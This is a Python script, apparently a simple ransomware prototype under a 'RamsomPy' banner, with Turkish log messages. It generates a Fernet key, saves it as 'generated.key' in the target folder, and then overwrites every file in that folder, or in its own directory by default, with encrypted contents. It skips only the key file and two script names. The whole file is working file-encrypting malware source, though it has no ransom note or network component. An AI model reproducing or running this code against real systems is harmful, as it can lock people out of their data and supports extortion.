import os
from cryptography.fernet import Fernet
from colorama import Fore,init
from pyfiglet import Figlet
from rich.console import Console
from optparse import OptionParser

console = Console()
init(autoreset=True)

class Encrpyt():
    def __init__(self):
        self.path = ''
        self.list_file = list()
        self.get_user_input()
        self.add_file_list()
        self.crypt()
        
    def get_user_input(self):
        parser = OptionParser()
        parser.add_option('-p', '--path', dest='path',
                          help='Şifrelenecek dosyaların bulunduğu klasör yolu')
        options, _ = parser.parse_args()  # ← Burada tuple olarak al

        if options.path:
            if os.path.isdir(options.path):
                self.path = options.path
            else:
                console.log('[red]Geçersiz path, klasör bulunamadı.[/red]')
                exit()
        else:
            self.path = os.path.dirname(os.path.abspath(__file__))
            console.log(f"[yellow]Path belirtilmedi, script dizini kullanılacak: {self.path}[/yellow]")
    
        
        
        
    def add_file_list(self):
        try:
            for file in os.listdir(self.path):
                if file == 'generated.key' or file == 'encrypgraph.py' or file == 'decrypgraph.py':
                    continue
                
                full_path = os.path.join(self.path, file)
                
                if not os.path.isdir(full_path):
                    self.list_file.append(file)
                    
        except FileNotFoundError:
            console.log('[red]Lütfen doğru bir path yolu giriniz.[/red]')
            exit()
    
    def crypt(self):
        try:
            key = Fernet.generate_key()
            with open(os.path.join(self.path, 'generated.key'),'wb') as k:
                k.write(key)
                console.log('[yellow]Key Oluşturuldu.[/yellow]')
            console.log('[yellow]Şifreleme başlıyor....[/yellow]')
            for file in self.list_file:
                full_path = os.path.join(self.path, file)
                with open(full_path,'rb') as f:
                    original_txt = f.read()
                with open(full_path,'wb') as ff:
                    crypt_txt = Fernet(key).encrypt(original_txt)
                    ff.write(crypt_txt)
            console.log('[green]Şifreleme bitti....[/green]')
            
        except ValueError:
            console.log('[red]İşlem başarısız oldu.[/red]')
            exit()
if __name__ == '__main__':
    
    figlet = Figlet(font='slant')
    print(Fore.CYAN +figlet.renderText('RamsomPy'))
    Encrpyt()
